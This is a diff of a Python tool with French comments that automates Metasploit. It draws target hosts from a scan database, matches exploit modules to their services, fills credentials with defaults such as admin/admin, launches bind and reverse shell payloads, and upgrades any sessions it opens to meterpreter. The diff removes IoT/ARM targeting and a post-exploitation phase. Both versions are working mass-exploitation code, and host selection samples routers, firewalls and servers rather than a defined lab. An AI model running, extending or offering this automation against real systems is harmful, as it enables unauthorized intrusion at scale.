@@ -251,19 +251,12 @@ _OS_EXPLOIT_PATHS = {
     'bsd':     ['exploit/freebsd/', 'exploit/netbsd/', 'exploit/unix/', 'exploit/multi/'],
     'solaris': ['exploit/solaris/', 'exploit/unix/', 'exploit/multi/'],
     'android': ['exploit/android/', 'exploit/multi/'],
-    # IoT/embedded : cibler les modules HTTP spécifiques routeurs + linux générique
-    'iot':     ['exploit/linux/http/', 'exploit/linux/misc/', 'exploit/unix/http/',
-                'exploit/multi/http/', 'exploit/multi/', 'exploit/linux/'],
 }
 
 
 def get_os_paths(os_name):
     """Retourne les préfixes de chemin d'exploit autorisés selon l'OS de la cible."""
     os_lower = (os_name or '').lower()
-    # IoT/embedded en premier (avant linux générique)
-    if any(k in os_lower for k in ('iot', 'embedded', 'openwrt', 'busybox',
-                                    'ddwrt', 'tomato', 'uclibc', 'router')):
-        return _OS_EXPLOIT_PATHS['iot']
     if 'windows' in os_lower:
         return _OS_EXPLOIT_PATHS['windows']
     if 'linux' in os_lower or 'ubuntu' in os_lower or 'debian' in os_lower:
@@ -292,21 +285,6 @@ def get_host_os(address):
                 return row[0] if row else None
     except Exception:
         return None
-
-
-def get_host_arch(address):
-    """Récupère l'arch de la cible depuis msf.hosts (armle, armbe, mipsle, x86, x64...)."""
-    try:
-        with psycopg2.connect(dbname=PG_DBNAME, user=PG_USER, password=PG_PASSWORD, host=PG_HOST) as conn:
-            with conn.cursor() as cur:
-                cur.execute(
-                    "SELECT arch FROM hosts WHERE host(address::inet) = %s LIMIT 1;",
-                    (str(address),)
-                )
-                row = cur.fetchone()
-                return (row[0] or '').lower() if row else ''
-    except Exception:
-        return ''
 
 
 def get_host_id(address):
@@ -477,38 +455,26 @@ def extract_search_terms_via_ai(services):
         return set()
 
 
-def build_targeted_exploits(client, services, os_name='', products=None):
+def build_targeted_exploits(client, services, os_name=''):
     """
     Construit une liste d'exploits ciblés basée sur les services découverts.
-    Si products (depuis bm12_v3 scan_details) est fourni, utilisé en priorité.
     Retourne une liste dédupliquée de modules exploit.
     """
     search_terms = set()
-
-    # Priorité : produits identifiés par bm12_v3
-    if products:
-        for p in products:
-            name = (p.get('name') or '').lower().strip()
-            if name and len(name) >= 3:
-                search_terms.add(name)
-        print(f"[PROD] Termes depuis bm12_v3 products: {sorted(search_terms)}")
-
-    # Fallback : mapping statique service → termes si aucun produit
-    if not search_terms:
-        for port, svc_name, *_ in services:
-            svc = (svc_name or '').lower()
-            if svc in SERVICE_EXPLOIT_MAP:
-                for term in SERVICE_EXPLOIT_MAP[svc]:
+    for port, svc_name, *_ in services:
+        svc = (svc_name or '').lower()
+        if svc in SERVICE_EXPLOIT_MAP:
+            for term in SERVICE_EXPLOIT_MAP[svc]:
+                search_terms.add(term)
+        elif port in PORT_SERVICE_MAP:
+            mapped = PORT_SERVICE_MAP[port]
+            if mapped in SERVICE_EXPLOIT_MAP:
+                for term in SERVICE_EXPLOIT_MAP[mapped]:
                     search_terms.add(term)
-            elif port in PORT_SERVICE_MAP:
-                mapped = PORT_SERVICE_MAP[port]
-                if mapped in SERVICE_EXPLOIT_MAP:
-                    for term in SERVICE_EXPLOIT_MAP[mapped]:
-                        search_terms.add(term)
 
-        # Enrichissement IA uniquement si pas de produits bm12
-        ai_terms = extract_search_terms_via_ai(services)
-        search_terms.update(ai_terms)
+    # Enrichissement IA : extraire les termes depuis la colonne info
+    ai_terms = extract_search_terms_via_ai(services)
+    search_terms.update(ai_terms)
 
     if not search_terms:
         print("[WARN] Aucun service mappé, fallback sur 'linux'")
@@ -533,22 +499,21 @@ def build_targeted_exploits(client, services, os_name='', products=None):
     return exploits
 
 
+# Récupérer tous les hôtes de debug depuis host_debug, ordonnés par id
 def get_all_debug_hosts():
-    """Sélectionne un hôte classifié par bm12_v3 avec des produits identifiés."""
+    type = 'Linux'
     try:
         with psycopg2.connect(dbname=PG_DBNAME, user=PG_USER, password=PG_PASSWORD, host=PG_HOST) as conn:
             with conn.cursor() as cur:
-                cur.execute(
-                    "SELECT id, address, scan_details FROM hosts TABLESAMPLE SYSTEM(0.5) "
-                    "WHERE scan_status = 'bm12_v3' "
-                    "AND scan_details IS NOT NULL "
-                    "AND (scan_details::jsonb) ? 'products' "
-                    "AND host(address::inet) NOT LIKE 'fe80:%%' "
-                    "LIMIT 1;"
+                cur.execute("SELECT id, address FROM hosts TABLESAMPLE SYSTEM(0.1) "  
+                    "WHERE os_name ILIKE %s "                                                           
+                    "AND purpose IN ('server', 'device', 'router', 'firewall') "                                  
+                    "AND host(address::inet) NOT LIKE 'fe80:%%' LIMIT 1;",                                        
+                    (f'%{type}%',)                   
                 )
                 return cur.fetchall()
     except psycopg2.Error as e:
-        print(f"[ERREUR] get_all_debug_hosts: {e}")
+        print(f"[ERREUR] Problème lors de la récupération des hôtes debug : {e}")
         return []
 
 
@@ -618,14 +583,8 @@ def upgrade_to_meterpreter(client, sid, host, bind_port=None):
     # 1. Détecter l'architecture
     arch = 'x86'
     out = shell_cmd('uname -m')
-    if 'x86_64' in out or 'amd64' in out:
+    if 'x86_64' in out:
         arch = 'x64'
-    elif 'aarch64' in out or 'arm64' in out:
-        arch = 'aarch64'
-    elif 'arm' in out:
-        arch = 'armle'
-    elif 'mips' in out:
-        arch = 'mipsle'
     print(f"[UPGRADE] Arch détectée: {arch}")
 
     payload = f'linux/{arch}/meterpreter/bind_tcp'
@@ -727,7 +686,7 @@ def main():
     else:
         print(f"[ERREUR] Port 5432 ouvert mais PostgreSQL ne répond pas à {pg_ip}")
         return
-
+    
 
     client = MsfRpcClient('totototo', port=55553, server="127.0.0.1", ssl=True)
 
@@ -749,37 +708,35 @@ def main():
     else:
         print("[WARN] LHOST non défini, listener non démarré")
 
+    debug_hosts = get_all_debug_hosts()
+    print(f"I======================>>>>%{debug_hosts}")
+    if not debug_hosts:
+        print("[DEBUG] Aucun hôte dans host_debug. Créer la table et insérer l'IP cible.")
+        return
+    print(f"[DEBUG] {len(debug_hosts)} hôte(s) à traiter séquentiellement.")
+    debug_index = 0
+    upgraded_sessions = set()
+    min_date = "2000-01-01"
+
     while True:
 
-     debug_hosts = get_all_debug_hosts()
-     if not debug_hosts:
-        print("[INFO] Aucun hôte bm12_v3 disponible — retry dans 60s.")
-        time.sleep(60)
-        continue
-     print(f"[DEBUG] {len(debug_hosts)} hôte(s) bm12_v3 à traiter.")
-     debug_index = 0
-     upgraded_sessions = set()
-     min_date = "2000-01-01"
      console_id = client.consoles.console().cid
      console = client.consoles.console(console_id)
-     host_id, host, scan_details_raw = debug_hosts[debug_index]
+     if debug_index >= len(debug_hosts):
+         print("[DEBUG] Tous les hôtes debug traités — reprise dans 60s.")
+         debug_index = 0
+         time.sleep(60)
+         continue
+     host_id, host = debug_hosts[debug_index]
      debug_index += 1
-     scan_details = json.loads(scan_details_raw) if isinstance(scan_details_raw, str) else (scan_details_raw or {})
-     products = scan_details.get('products', [])
-     print(f"[DEBUG] Cible {debug_index}/{len(debug_hosts)} : {host} | produits: {[p['name'] for p in products]}")
+     print(f"[DEBUG] Cible {debug_index}/{len(debug_hosts)} : {host}")
      services = get_host_services_by_address(str(host))
      if not services:
          print(f"[DEBUG] Aucun service connu pour {host} — skip.")
          continue
      print(f"[DEBUG] {len(services)} services: {[(p, s) for p, s, *_ in services]}")
      os_name = get_host_os(str(host)) or 'Linux'
-     # Forcer iot_embedded si bm12 l'a classifié ainsi
-     host_type = scan_details.get('type', '')
-     if host_type == 'iot_embedded':
-         os_name = 'iot_embedded'
-     host_arch = get_host_arch(str(host)) or scan_details.get('arch', '')
-     print(f"[INFO] OS: {os_name} | Arch: {host_arch or 'unknown'}")
-     search_results = build_targeted_exploits(client, services, os_name, products=products)
+     search_results = build_targeted_exploits(client, services, os_name)
 
      if not host:
          print("[INFO] Aucun hôte disponible.")
@@ -789,221 +746,182 @@ def main():
      print(f"[INFO] Scan de {host} en cours... ports ouverts: {sorted(open_ports)}")
 
      run_start = time.time()
-     stats = {'tried': 0, 'check_failed': 0, 'missing': 0, 'samba': 0, 'pwned': [], 'post_tried': 0}
+     stats = {'tried': 0, 'check_failed': 0, 'missing': 0, 'samba': 0, 'pwned': []}
 
-     # Séparer exploits remote (Phase 1) et post-exploitation (Phase 2)
-     _POST_PATHS = ('exploit/linux/local/', 'exploit/linux/persistence/')
-     remote_exploits = [m for m in search_results if not any(m.get('fullname', '').startswith(p) for p in _POST_PATHS)]
-     post_exploits   = [m for m in search_results if any(m.get('fullname', '').startswith(p) for p in _POST_PATHS)]
-     print(f"[INFO] Phase 1: {len(remote_exploits)} remote | Phase 2: {len(post_exploits)} post-exploitation")
+     check_con = client.consoles.console()
+     for index in range(0, len(search_results)):
+        if (search_results[index]['type'] != 'exploit'):
+            print('+', end="")
+            continue
 
-     def _rank(p):
-         if 'interact' in p: return 0
-         if p.startswith('cmd/unix/') and 'bind' in p and 'netcat' in p: return 1
-         if p.startswith('cmd/unix/') and 'bind' in p and 'perl' in p: return 2
-         # Priorité ARM/MIPS quand la cible est ARM/MIPS
-         is_arm  = 'arm'  in (host_arch or '')
-         is_mips = 'mips' in (host_arch or '')
-         if is_arm  and p.startswith('linux/arm')  and 'bind' in p: return 3
-         if is_mips and p.startswith('linux/mips') and 'bind' in p: return 3
-         if is_arm  and p.startswith('linux/arm'): return 4
-         if is_mips and p.startswith('linux/mips'): return 4
-         if p == 'linux/x86/shell_bind_tcp': return 5
-         if p == 'linux/x64/shell_bind_tcp': return 5
-         if p.startswith('cmd/unix/') and 'bind' in p: return 6
-         if p.startswith('cmd/unix/') and 'reverse' in p and 'netcat' in p: return 7
-         if p.startswith('cmd/unix/') and 'reverse' in p: return 8
-         if 'bind' in p: return 9
-         return 10
+        if (search_results[index]['disclosuredate'] < min_date):
+            print('+', end="")
+            continue
 
-     def _run_exploit_list(exploit_list, phase_session_id=None):
-         """
-         Exécute une liste d'exploits MSF.
-         phase_session_id : si défini (Phase 2), SESSION est pré-rempli avec cet ID.
-         """
-         check_con = client.consoles.console()
-         for mod in exploit_list:
-             if mod['type'] != 'exploit':
-                 print('+', end="")
-                 continue
-             if mod['disclosuredate'] < min_date:
-                 print('+', end="")
-                 continue
-             if 'samba' in mod['fullname']:
-                 print(f"[DEBUG] Skip samba: {mod['fullname']}")
-                 stats['samba'] += 1
-                 continue
+        # Sauter les modules samba — crashent ou bloquent Metasploitable2
+        if 'samba' in search_results[index]['fullname']:
+            print(f"[DEBUG] Skip samba: {search_results[index]['fullname']}")
+            stats['samba'] += 1
+            continue
 
-             try:
-                 _fullname = mod['fullname']
-                 _modname = _fullname[len('exploit/'):] if _fullname.startswith('exploit/') else _fullname
-                 exploit = client.modules.use('exploit', _modname)
-             except Exception:
-                 print("erreur dans les resultats")
-                 continue
+        try:
+#            print (search_results[index])
+            _fullname = search_results[index]['fullname']
+            _modname = _fullname[len('exploit/'):] if _fullname.startswith('exploit/') else _fullname
+            exploit = client.modules.use('exploit', _modname)
+        except:
+            print ("erreur dans les resultats")
+            continue
 
-             exploit.target = 0
+        exploit.target = 0
+        try:
+            rport = exploit.runoptions.get('RPORT')
+            if rport is not None and open_ports:
+                if int(rport) not in open_ports:
+                    continue
+                exploit['RPORT'] = int(rport)
+        except (TypeError, ValueError):
+            pass
+        payload = exploit.targetpayloads()
+        missing  =  exploit.missing_required
+        if (len(missing) > 0):
+          active_sessions = client.sessions.list
+          for index1 in range(0, len(missing)):
+            match missing[index1]:
+               case "RHOSTS":
+                    try:
+                        addr = ipaddress.ip_address(str(host).split("/")[0])
+                        rhosts_val = f"[{host}]" if addr.version == 6 else str(host)
+                    except ValueError:
+                        rhosts_val = str(host)
+                    exploit[missing[index1]] = rhosts_val
+               case "TARGET_PATH":
+                    exploit[missing[index1]] = "/"
+               case "SESSION":
+                    if active_sessions:
+                        exploit[missing[index1]] = int(next(iter(active_sessions)))
+                    else:
+                        print(f"[SKIP] SESSION requise mais aucune session active")
+               case "LHOST":
+                    exploit[missing[index1]] = LHOST
+               case "RPORT":
+                    # Prendre le premier port ouvert connu, sinon skip
+                    if open_ports:
+                        exploit[missing[index1]] = next(iter(sorted(open_ports)))
+                    else:
+                        print(f"[SKIP] RPORT requis mais aucun port ouvert connu")
+               case "PASSWORD" | "PASS" | "SMBPass" | "FTP_PASS":
+                    exploit[missing[index1]] = ""
+               case "TARGETURI":
+                    exploit[missing[index1]] = "/"
+               case "USERNAME" | "HttpUsername" | "FTPUSER" | "SSH_USER":
+                    exploit[missing[index1]] = "admin"
+               case "HttpPassword" | "FTPPASS":
+                    exploit[missing[index1]] = "admin"
+               case "VHOST":
+                    exploit[missing[index1]] = str(host).split("/")[0]
+               case _:
+                    print (f"Pas traite {missing[index1]}")
+        if exploit.missing_required:
+            print(f"[SKIP] Champs manquants : {exploit.missing_required} — {search_results[index]['fullname']}")
+            stats['missing'] += 1
+            continue
+        print (f"missing résolus : {search_results[index]['fullname']}")
 
-             # Phase 2 : injecter SESSION en premier
-             if phase_session_id is not None:
-                 try:
-                     exploit['SESSION'] = phase_session_id
-                 except Exception:
-                     pass
+        if not check_target(check_con, search_results[index]['fullname'],
+                            exploit.runoptions.get('RHOSTS'), exploit.runoptions.get('RPORT')):
+            print(f"[CHECK] Non vulnérable — skip")
+            stats['check_failed'] += 1
+            continue
 
-             try:
-                 rport = exploit.runoptions.get('RPORT')
-                 if rport is not None and open_ports:
-                     if int(rport) not in open_ports:
-                         continue
-                     exploit['RPORT'] = int(rport)
-             except (TypeError, ValueError):
-                 pass
+#        print (exploit.runoptions)
+#        print (f" payload {payload}")
+        payload = [p for p in payload if p.startswith('linux/') or p.startswith('cmd/unix/')]
+        # Sélectionner les meilleurs payloads : interact > cmd bind > linux bind > cmd reverse
+        def _rank(p):
+            if 'interact' in p: return 0
+            if p.startswith('cmd/unix/') and 'bind' in p and 'netcat' in p: return 1
+            if p.startswith('cmd/unix/') and 'bind' in p and 'perl' in p: return 2
+            if p == 'linux/x86/shell_bind_tcp': return 3
+            if p == 'linux/x64/shell_bind_tcp': return 4
+            if p.startswith('cmd/unix/') and 'bind' in p: return 5
+            if p.startswith('cmd/unix/') and 'reverse' in p and 'netcat' in p: return 6
+            if p.startswith('cmd/unix/') and 'reverse' in p: return 7
+            if 'bind' in p: return 8
+            return 9
+        payload = sorted(payload, key=_rank)[:5]
+        if (len (payload) > 0):
+          if ( MODE_RUN == 1 ):
+            for index1 in range(0, len(payload)):
+              stats['tried'] += 1
+              sessions_before = set(client.sessions.list.keys())
+              print (f"{search_results[index]['fullname']} payload {payload[index1]}", end='')
+              try:
+                  payload_obj = client.modules.use('payload', payload[index1])
+                  if 'reverse' in payload[index1]:
+                      try:
+                          payload_obj['LHOST'] = LHOST
+                      except KeyError:
+                          pass
+                      # Utiliser le multi/handler existant — évite le conflit sur port 4444
+                      try:
+                          exploit['DisablePayloadHandler'] = True
+                      except Exception:
+                          pass
+                  else:
+                      try:
+                          exploit['DisablePayloadHandler'] = False
+                      except Exception:
+                          pass
+                  if 'reverse' in payload[index1] or 'bind' in payload[index1]:
+                      try:
+                          payload_obj['LPORT'] = LPORT_BIND if 'bind' in payload[index1] else LPORT
+                      except KeyError:
+                          pass
+                  output = console.run_module_with_output(exploit, payload_obj, timeout=30)
+                  # Tuer les jobs MSF résiduels pour libérer la console
+                  try:
+                      console.write("jobs -K\n")
+                      time.sleep(1)
+                      console.read()
+                  except Exception:
+                      pass
+                  short = (output or '').strip().replace('\n', ' ')[:150]
+                  print(f": Ok [{short}]")
+              except Exception as e:
+                  print (f": {type(e).__name__}: {e}")
+                  continue
+              while console.is_busy():
+                   print("+",end="")
+                   time.sleep(1)
+              # Polling session — laisser le temps à MSF d'établir la connexion
+              for _ in range(6):
+                  sessions_now = client.sessions.list
+                  new_sessions = set(sessions_now.keys()) - sessions_before
+                  if new_sessions:
+                      break
+                  time.sleep(2)
+              else:
+                  sessions_now = client.sessions.list
+                  new_sessions = set(sessions_now.keys()) - sessions_before
+              if new_sessions:
+                  handle_new_sessions(client, sessions_now, upgraded_sessions, host)
+                  stats['pwned'].append((search_results[index]['fullname'], payload[index1]))
+                  print(f"[PWN] {search_results[index]['fullname']} → sessions {sorted(new_sessions)}")
+                  report_vuln(str(host), search_results[index]['fullname'], payload[index1], sorted(new_sessions)[0])
+                  break  # session ouverte — inutile d'essayer d'autres payloads
 
-             payload = exploit.targetpayloads()
-             missing = exploit.missing_required
-             if len(missing) > 0:
-                 active_sessions = client.sessions.list
-                 for field in missing:
-                     match field:
-                         case "RHOSTS":
-                             try:
-                                 addr = ipaddress.ip_address(str(host).split("/")[0])
-                                 rhosts_val = f"[{host}]" if addr.version == 6 else str(host)
-                             except ValueError:
-                                 rhosts_val = str(host)
-                             exploit[field] = rhosts_val
-                         case "TARGET_PATH":
-                             exploit[field] = "/"
-                         case "SESSION":
-                             if active_sessions:
-                                 exploit[field] = int(next(iter(active_sessions)))
-                             else:
-                                 # Pas de session disponible — sera traité en Phase 2
-                                 stats['missing'] += 1
-                                 break
-                         case "LHOST":
-                             exploit[field] = LHOST
-                         case "RPORT":
-                             if open_ports:
-                                 exploit[field] = next(iter(sorted(open_ports)))
-                             else:
-                                 print(f"[SKIP] RPORT requis mais aucun port ouvert connu")
-                         case "PASSWORD" | "PASS" | "SMBPass" | "FTP_PASS":
-                             exploit[field] = ""
-                         case "TARGETURI":
-                             exploit[field] = "/"
-                         case "USERNAME" | "HttpUsername" | "FTPUSER" | "SSH_USER":
-                             exploit[field] = "admin"
-                         case "HttpPassword" | "FTPPASS":
-                             exploit[field] = "admin"
-                         case "VHOST":
-                             exploit[field] = str(host).split("/")[0]
-                         case _:
-                             print(f"Pas traite {field}")
-
-             if exploit.missing_required:
-                 print(f"[SKIP] Champs manquants : {exploit.missing_required} — {mod['fullname']}")
-                 stats['missing'] += 1
-                 continue
-             print(f"missing résolus : {mod['fullname']}")
-
-             if not check_target(check_con, mod['fullname'],
-                                 exploit.runoptions.get('RHOSTS'), exploit.runoptions.get('RPORT')):
-                 print(f"[CHECK] Non vulnérable — skip")
-                 stats['check_failed'] += 1
-                 continue
-
-             payload = [p for p in payload if p.startswith('linux/') or p.startswith('cmd/unix/')]
-             payload = sorted(payload, key=_rank)[:5]
-             if len(payload) > 0 and MODE_RUN == 1:
-                 for p in payload:
-                     if phase_session_id is not None:
-                         stats['post_tried'] += 1
-                     else:
-                         stats['tried'] += 1
-                     sessions_before = set(client.sessions.list.keys())
-                     print(f"{mod['fullname']} payload {p}", end='')
-                     try:
-                         payload_obj = client.modules.use('payload', p)
-                         if 'reverse' in p:
-                             try:
-                                 payload_obj['LHOST'] = LHOST
-                             except KeyError:
-                                 pass
-                             # Utiliser le multi/handler existant — évite le conflit sur port 4444
-                             try:
-                                 exploit['DisablePayloadHandler'] = True
-                             except Exception:
-                                 pass
-                         else:
-                             try:
-                                 exploit['DisablePayloadHandler'] = False
-                             except Exception:
-                                 pass
-                         if 'reverse' in p or 'bind' in p:
-                             try:
-                                 payload_obj['LPORT'] = LPORT_BIND if 'bind' in p else LPORT
-                             except KeyError:
-                                 pass
-                         output = console.run_module_with_output(exploit, payload_obj, timeout=30)
-                         # Tuer les jobs MSF résiduels pour libérer la console
-                         try:
-                             console.write("jobs -K\n")
-                             time.sleep(1)
-                             console.read()
-                         except Exception:
-                             pass
-                         short = (output or '').strip().replace('\n', ' ')[:150]
-                         print(f": Ok [{short}]")
-                     except Exception as e:
-                         print(f": {type(e).__name__}: {e}")
-                         continue
-                     while console.is_busy():
-                         print("+", end="")
-                         time.sleep(1)
-                     # Polling session — laisser le temps à MSF d'établir la connexion
-                     for _ in range(6):
-                         sessions_now = client.sessions.list
-                         new_sessions = set(sessions_now.keys()) - sessions_before
-                         if new_sessions:
-                             break
-                         time.sleep(2)
-                     else:
-                         sessions_now = client.sessions.list
-                         new_sessions = set(sessions_now.keys()) - sessions_before
-                     if new_sessions:
-                         handle_new_sessions(client, sessions_now, upgraded_sessions, host)
-                         stats['pwned'].append((mod['fullname'], p))
-                         print(f"[PWN] {mod['fullname']} → sessions {sorted(new_sessions)}")
-                         report_vuln(str(host), mod['fullname'], p, sorted(new_sessions)[0])
-                         break  # session ouverte — inutile d'essayer d'autres payloads
-         check_con.destroy()
-
-     # Phase 1 : exploits remote (accès initial)
-     print(f"\n[PHASE 1] Exploits remote sur {host}")
-     _run_exploit_list(remote_exploits)
-
-     # Phase 2 : post-exploitation si au moins une session active
-     sessions_after_p1 = client.sessions.list
-     if sessions_after_p1 and post_exploits:
-         sid_p2 = int(next(iter(sessions_after_p1)))
-         print(f"\n[PHASE 2] {len(post_exploits)} exploits post-exploitation (session #{sid_p2})")
-         _run_exploit_list(post_exploits, phase_session_id=sid_p2)
-     elif post_exploits:
-         print(f"[PHASE 2] Skippée — aucune session obtenue en Phase 1")
-
+     check_con.destroy()
      elapsed = int(time.time() - run_start)
      sessions_final = client.sessions.list
      print(f"\n{'='*60}")
      print(f"[RAPPORT] Cible : {host}  |  Durée : {elapsed}s")
-     print(f"  Exploits remote testés : {stats['tried']}")
-     print(f"  Post-exploitation      : {stats['post_tried']}")
-     print(f"  Check non-vuln         : {stats['check_failed']}")
-     print(f"  Champs manquants       : {stats['missing']}")
-     print(f"  Samba skippés          : {stats['samba']}")
-     print(f"  Vecteurs confirmés     : {len(stats['pwned'])}")
-     print(f"  Sessions actives       : {len(sessions_final)}  {list(sessions_final.keys())}")
+     print(f"  Exploits testés    : {stats['tried']}")
+     print(f"  Check non-vuln     : {stats['check_failed']}")
+     print(f"  Champs manquants   : {stats['missing']}")
+     print(f"  Samba skippés      : {stats['samba']}")
+     print(f"  Vecteurs confirmés : {len(stats['pwned'])}")
+     print(f"  Sessions actives   : {len(sessions_final)}  {list(sessions_final.keys())}")
      if stats['pwned']:
          print(f"  Vecteurs gagnants  :")
          for exploit_name, payload_name in stats['pwned']:
@@ -1023,4 +941,5 @@ def main():
 
 if __name__ == "__main__":
     main()
+
 
